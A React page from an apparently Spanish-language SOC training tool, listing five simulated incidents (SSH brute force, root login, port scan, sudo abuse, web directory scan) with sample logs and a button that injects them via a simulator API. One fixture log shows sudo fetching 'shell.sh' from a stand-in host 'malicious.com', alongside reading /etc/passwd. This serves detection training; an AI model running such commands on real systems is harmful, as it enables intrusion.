import { useState, useEffect } from 'react';
import { generateSimulator } from '../services/api';

const CASOS_DEFAULT = [
  {
    id: 1,
    titulo: "Ataque de Fuerza Bruta SSH",
    fecha: "2024-03-15 14:32:00",
    severidad: "high",
    ip_atacante: "192.168.1.105",
    usuario: "admin",
    descripcion: "Múltiples intentos de login SSH fallidos detectados desde IP externa",
    logs: [
      "Mar 15 14:30:01 server1 sshd[12345]: Failed password for invalid user admin from 192.168.1.105 port 45231 ssh2",
      "Mar 15 14:30:03 server1 sshd[12347]: Failed password for invalid user admin from 192.168.1.105 port 45232 ssh2",
      "Mar 15 14:30:05 server1 sshd[12349]: Failed password for invalid user admin from 192.168.1.105 port 45233 ssh2",
      "Mar 15 14:30:07 server1 sshd[12351]: Failed password for invalid user admin from 192.168.1.105 port 45234 ssh2",
      "Mar 15 14:30:09 server1 sshd[12353]: Failed password for invalid user admin from 192.168.1.105 port 45235 ssh2",
      "Mar 15 14:30:11 server1 sshd[12355]: Failed password for invalid user admin from 192.168.1.105 port 45236 ssh2"
    ]
  },
  {
    id: 2,
    titulo: "Intento de Acceso Root",
    fecha: "2024-03-18 09:15:00",
    severidad: "critical",
    ip_atacante: "10.0.0.50",
    usuario: "root",
    descripcion: "Intento directo de acceso como usuario root detectado",
    logs: [
      "Mar 18 09:14:55 server1 sshd[23456]: Failed password for root from 10.0.0.50 port 48291 ssh2",
      "Mar 18 09:15:01 server1 sshd[23458]: Failed password for root from 10.0.0.50 port 48292 ssh2"
    ]
  },
  {
    id: 3,
    titulo: "Escaneo de Puertos",
    fecha: "2024-03-20 16:45:00",
    severidad: "medium",
    ip_atacante: "172.16.0.100",
    usuario: "N/A",
    descripcion: "Detección de escaneo de puertos múltiples en firewall",
    logs: [
      "Mar 20 16:44:00 firewall iptables DROP: IN=eth0 OUT= MAC=00:00 SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=22 SYN",
      "Mar 20 16:44:02 firewall iptables DROP: IN=eth0 OUT= MAC=00:00 SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=80 SYN",
      "Mar 20 16:44:04 firewall iptables DROP: IN=eth0 OUT= MAC=00:00 SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=443 SYN",
      "Mar 20 16:44:06 firewall iptables DROP: IN=eth0 OUT= MAC=00:00 SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=3306 SYN",
      "Mar 20 16:44:08 firewall iptables DROP: IN=eth0 OUT= MAC=00:00 SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=5432 SYN"
    ]
  },
  {
    id: 4,
    titulo: "Abuso de sudo",
    fecha: "2024-03-22 11:20:00",
    severidad: "medium",
    ip_atacante: "192.168.1.50",
    usuario: "www-data",
    descripcion: "Ejecución excesiva de comandos con privilegios sudo",
    logs: [
      "Mar 22 11:15:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/cat /etc/passwd",
      "Mar 22 11:16:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/ls /root",
      "Mar 22 11:17:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/wget http://malicious.com/shell.sh"
    ]
  },
  {
    id: 5,
    titulo: "Escaneo de Directorios Web",
    fecha: "2024-03-25 08:30:00",
    severidad: "medium",
    ip_atacante: "203.0.113.25",
    usuario: "N/A",
    descripcion: "Acceso a rutas sensibles de aplicaciones web",
    logs: [
      'Mar 25 08:29:00 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:00 +0000] "GET /admin HTTP/1.1" 404 1234 "-" "Mozilla/5.0"',
      'Mar 25 08:29:02 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 1234 "-" "Mozilla/5.0"',
      'Mar 25 08:29:04 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:04 +0000] "GET /.env HTTP/1.1" 404 1234 "-" "Mozilla/5.0"',
      'Mar 25 08:29:06 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:06 +0000] "GET /wp-admin HTTP/1.1" 404 1234 "-" "Mozilla/5.0"'
    ]
  }
];

export default function Casos() {
  const [casos, setCasos] = useState(CASOS_DEFAULT);
  const [casoSeleccionado, setCasoSeleccionado] = useState(null);
  const [loading, setLoading] = useState(false);
  const [resultado, setResultado] = useState(null);
  const [mostrarResumen, setMostrarResumen] = useState(false);

  const getSeverityColor = (severidad) => {
    switch (severidad) {
      case 'critical': return 'bg-red-600';
      case 'high': return 'bg-orange-600';
      case 'medium': return 'bg-yellow-600';
      default: return 'bg-green-600';
    }
  };

  const getSeverityText = (severidad) => {
    switch (severidad) {
      case 'critical': return 'text-red-400';
      case 'high': return 'text-orange-400';
      case 'medium': return 'text-yellow-400';
      default: return 'text-green-400';
    }
  };

  const handleInyectar = async () => {
    if (!casoSeleccionado) return;
    
    setLoading(true);
    setResultado(null);
    
    try {
      // Determinar tipo de simulación según el caso
      let tipo = 'info';
      let cantidad = 1;
      
      if (casoSeleccionado.titulo.toLowerCase().includes('fuerza bruta')) {
        tipo = 'ssh_brute_force';
        cantidad = 6;
      } else if (casoSeleccionado.titulo.toLowerCase().includes('root')) {
        tipo = 'root_login';
        cantidad = 1;
      } else if (casoSeleccionado.titulo.toLowerCase().includes('escaneo') && casoSeleccionado.titulo.toLowerCase().includes('puerto')) {
        tipo = 'port_scan';
        cantidad = 5;
      } else if (casoSeleccionado.titulo.toLowerCase().includes('sudo')) {
        tipo = 'sudo_abuse';
        cantidad = 10;
      } else if (casoSeleccionado.titulo.toLowerCase().includes('directorio') || casoSeleccionado.titulo.toLowerCase().includes('web')) {
        tipo = 'directory_scan';
        cantidad = 3;
      }
      
      const { data } = await generateSimulator({
        tipo,
        ip_origen: casoSeleccionado.ip_atacante,
        cantidad
      });
      
      setResultado({
        success: true,
        alerta: data.alerta,
        message: `Logs del caso "${casoSeleccionado.titulo}" inyectados correctamente`
      });
      
      setCasoSeleccionado(null);
      setMostrarResumen(false);
      
    } catch (error) {
      setResultado({
        success: false,
        message: 'Error al inyectar logs: ' + error.message
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="p-6 space-y-6 overflow-auto h-full">
      <div>
        <h1 className="text-2xl font-bold">📚 Casos de Estudio</h1>
        <p className="text-gray-400 text-sm">Selecciona un caso real para simular el ataque</p>
      </div>

      {/* Lista de Casos */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {casos.map((caso) => (
          <div
            key={caso.id}
            className={`bg-gray-800 rounded-lg p-4 border cursor-pointer transition-all hover:scale-[1.02] ${
              casoSeleccionado?.id === caso.id 
                ? 'border-blue-500 ring-2 ring-blue-500/30' 
                : 'border-gray-700 hover:border-gray-600'
            }`}
            onClick={() => {
              setCasoSeleccionado(caso);
              setMostrarResumen(true);
              setResultado(null);
            }}
          >
            <div className="flex justify-between items-start mb-2">
              <h3 className="font-semibold">{caso.titulo}</h3>
              <span className={`px-2 py-0.5 rounded text-xs font-bold uppercase ${getSeverityColor(caso.severidad)} text-white`}>
                {caso.severidad}
              </span>
            </div>
            <p className="text-gray-400 text-sm mb-2">{caso.descripcion}</p>
            <div className="flex justify-between text-xs text-gray-500">
              <span>IP: {caso.ip_atacante}</span>
              <span>{caso.logs.length} logs</span>
            </div>
          </div>
        ))}
      </div>

      {/* Resumen del Caso Seleccionado */}
      {mostrarResumen && casoSeleccionado && (
        <div className="bg-gray-800 rounded-lg p-6 border border-blue-500">
          <div className="flex justify-between items-start mb-4">
            <div>
              <h2 className="text-xl font-bold">{casoSeleccionado.titulo}</h2>
              <span className={`inline-block px-2 py-0.5 rounded text-xs font-bold uppercase ${getSeverityColor(casoSeleccionado.severidad)} text-white mt-2`}>
                {casoSeleccionado.severidad}
              </span>
            </div>
            <button 
              onClick={() => {
                setMostrarResumen(false);
                setCasoSeleccionado(null);
              }}
              className="text-gray-400 hover:text-white text-2xl"
            >
              ✕
            </button>
          </div>
          
          <div className="grid grid-cols-2 gap-4 mb-4">
            <div>
              <p className="text-gray-400 text-sm">Fecha del Caso</p>
              <p className="font-mono">{casoSeleccionado.fecha}</p>
            </div>
            <div>
              <p className="text-gray-400 text-sm">IP Atacante</p>
              <p className="font-mono">{casoSeleccionado.ip_atacante}</p>
            </div>
            <div>
              <p className="text-gray-400 text-sm">Usuario Objetivo</p>
              <p className="font-mono">{casoSeleccionado.usuario}</p>
            </div>
            <div>
              <p className="text-gray-400 text-sm">Cantidad de Logs</p>
              <p>{casoSeleccionado.logs.length} eventos</p>
            </div>
          </div>
          
          <div>
            <p className="text-gray-400 text-sm mb-2">Descripción</p>
            <p>{casoSeleccionado.descripcion}</p>
          </div>
          
          <div className="mt-4">
            <p className="text-gray-400 text-sm mb-2">Preview de Logs</p>
            <pre className="bg-gray-900 p-3 rounded text-xs overflow-x-auto max-h-32">
              {casoSeleccionado.logs.slice(0, 3).join('\n')}
              {casoSeleccionado.logs.length > 3 && '\n...'}
            </pre>
          </div>
          
          <div className="mt-6 flex gap-3">
            <button
              onClick={handleInyectar}
              disabled={loading}
              className="bg-blue-600 hover:bg-blue-500 disabled:opacity-50 px-6 py-2 rounded font-semibold"
            >
              {loading ? 'Inyectando...' : '🚀 Inyectar Logs'}
            </button>
            <button
              onClick={() => {
                setMostrarResumen(false);
                setCasoSeleccionado(null);
              }}
              className="bg-gray-700 hover:bg-gray-600 px-6 py-2 rounded"
            >
              Cancelar
            </button>
          </div>
          
          {resultado && (
            <div className={`mt-4 p-4 rounded ${resultado.success ? 'bg-green-900/50 text-green-400' : 'bg-red-900/50 text-red-400'}`}>
              {resultado.message}
            </div>
          )}
        </div>
      )}
    </div>
  );
}